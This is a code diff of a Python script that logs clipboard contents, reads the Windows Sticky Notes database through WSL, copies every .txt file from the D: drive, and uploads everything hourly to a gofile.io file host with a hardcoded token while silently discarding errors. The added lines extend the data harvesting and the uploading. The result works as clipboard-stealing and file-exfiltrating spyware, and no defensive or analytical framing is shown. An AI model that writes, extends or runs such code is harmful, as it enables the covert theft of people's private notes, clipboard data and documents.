@@ -1,9 +1,25 @@
+import os
+import shutil
 import time
 import subprocess
 import requests
 from datetime import datetime
 import threading
-import os
+
+root_directory = "/mnt/d"
+destination_directory = os.path.expanduser("~/dev/BackupTxtFiles")
+
+os.makedirs(destination_directory, exist_ok=True)
+
+for dirpath, dirnames, filenames in os.walk(root_directory):
+    for filename in filenames:
+        if filename.endswith(".txt"):
+            source_file_path = os.path.join(dirpath, filename)
+            destination_file_path = os.path.join(destination_directory, filename)
+            if not os.path.exists(destination_file_path) or (
+                os.path.getmtime(source_file_path) > os.path.getmtime(destination_file_path)
+            ):
+                shutil.copy2(source_file_path, destination_file_path)
 
 def get_clipboard_content():
     try:
@@ -18,20 +34,34 @@ def log_clipboard_update(content, file_path):
 
 def upload_file(file_path, api_token):
     try:
-        last_modified_time = os.path.getmtime(file_path)
-        if not hasattr(upload_file, 'last_uploaded_time'):
-            upload_file.last_uploaded_time = {}
-        if file_path not in upload_file.last_uploaded_time or last_modified_time > upload_file.last_uploaded_time[file_path]:
-            with open(file_path, "rb") as f:
-                response = requests.post(
-                    "https://store9.gofile.io/uploadFile",
-                    files={"file": f},
-                    data={"token": api_token}
-                )
-                if response.status_code == 200:
-                    upload_file.last_uploaded_time[file_path] = last_modified_time
+        with open(file_path, "rb") as f:
+            requests.post(
+                "https://store9.gofile.io/uploadFile",
+                files={"file": f},
+                data={"token": api_token}
+            )
     except:
         pass
+
+def calculate_directory_size(directory_path):
+    total_size = 0
+    for root, _, files in os.walk(directory_path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            if os.path.isfile(file_path):
+                total_size += os.path.getsize(file_path)
+    return total_size
+
+def upload_directory_if_changed(directory_path, api_token):
+    if not hasattr(upload_directory_if_changed, 'last_size'):
+        upload_directory_if_changed.last_size = 0
+    current_size = calculate_directory_size(directory_path)
+    if current_size != upload_directory_if_changed.last_size:
+        upload_directory_if_changed.last_size = current_size
+        for root, _, files in os.walk(directory_path):
+            for file in files:
+                file_path = os.path.join(root, file)
+                upload_file(file_path, api_token)
 
 def monitor_clipboard(file_path):
     last_content = ""
@@ -42,10 +72,11 @@ def monitor_clipboard(file_path):
             last_content = current_content
         time.sleep(3)
 
-def periodic_upload(files, api_token):
+def periodic_upload(files, directory, api_token):
     while True:
         for file_path in files:
             upload_file(file_path, api_token)
+        upload_directory_if_changed(directory, api_token)
         time.sleep(3600)
 
 def get_windows_username():
@@ -60,17 +91,19 @@ def get_windows_username():
 if __name__ == '__main__':
     clipboard_log_path = os.path.expanduser("~/dev/ba.txt")
     windows_user = get_windows_username()
-    if not windows_user:
-        pass
-
+    
     sticky_notes_path = f"/mnt/c/Users/{windows_user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
-    
     if not os.path.isfile(sticky_notes_path):
-        pass
-    
+        sticky_notes_path = None
+
     api_token = "jnJSH32mlnYRiF7uyJ2d7PQg0CLAqKcq"
     os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
     open(clipboard_log_path, 'a').close()
 
+    files_to_upload = [clipboard_log_path]
+    if sticky_notes_path:
+        files_to_upload.append(sticky_notes_path)
+    backup_folder_path = destination_directory
+
     threading.Thread(target=monitor_clipboard, args=(clipboard_log_path,)).start()
-    threading.Thread(target=periodic_upload, args=([clipboard_log_path, sticky_notes_path], api_token)).start()
+    threading.Thread(target=periodic_upload, args=(files_to_upload, backup_folder_path, api_token)).start()
